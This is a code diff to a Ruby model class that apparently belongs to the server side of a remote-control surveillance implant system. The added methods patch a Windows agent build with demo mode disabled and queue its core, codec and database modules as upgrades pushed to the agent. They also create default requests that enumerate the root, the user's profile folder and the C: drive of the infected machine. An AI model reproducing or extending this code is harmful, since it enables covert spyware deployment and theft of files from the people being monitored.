@@ -2,6 +2,8 @@
 
 require 'mongoid'
 
+require_relative '../build'
+
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/crypt'
@@ -146,6 +148,45 @@ class Item
     agent.stat = ns
 
     return agent
+  end
+
+  def add_first_time_uploads
+    return if self[:_kind] != 'agent'
+
+    if self.platform == 'windows'
+      factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+      build = RCS::DB::Build.factory(:windows)
+      build.load({'_id' => factory._id})
+      build.unpack
+      build.patch({'demo' => false})
+
+      # copy the files in the upgrade collection
+      add_upgrade('core64', File.join(build.tmpdir, 'core64'))
+      add_upgrade('rapi', File.join(build.tmpdir, 'rapi'))
+      add_upgrade('codec', File.join(build.tmpdir, 'codec'))
+      add_upgrade('sqlite', File.join(build.tmpdir, 'sqlite'))
+
+      build.clean
+    end
+
+  end
+
+  def add_upgrade(name, file)
+    content = File.binread(file)
+    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name})] })
+  end
+
+  def add_default_filesystem_requests
+    return if self[:_kind] != 'agent'
+
+    # the request for the root
+    self.filesystem_requests.create!({path: '/', depth: 1})
+
+    # the home for the current user
+    self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
+
+    # special request for windows to have the c: drive
+    self.filesystem_requests.create!({path: '%HOMEDRIVE%\\\\*', depth: 1}) if self.platform == 'windows'
   end
 
   protected
